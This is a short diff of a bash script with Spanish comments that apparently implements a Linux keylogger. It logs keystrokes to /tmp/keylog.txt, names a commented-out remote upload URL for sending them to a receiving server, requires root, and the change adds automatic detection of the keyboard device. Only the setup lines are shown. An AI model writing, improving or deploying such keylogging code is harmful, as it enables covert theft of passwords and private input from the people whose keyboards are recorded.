@@ -1,8 +1,12 @@
 #!/bin/bash
 
+# Archivo a guardar las teclas y URL del servidor receptor
 LOG_FILE="/tmp/keylog.txt"
-DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto
 # SERVER_URL="http://server-prueba.com/upload"
+
+# Registro automatico del teclado en uso
+DEVICE=$(ls /dev/input/by-id/ | grep -i "keyboard" | head -n 1)
+DEVICE="/dev/input/by-id/$DEVICE"
 
 # Verifica que el script se ejecute como root
 if [[ $EUID -ne 0 ]]; then
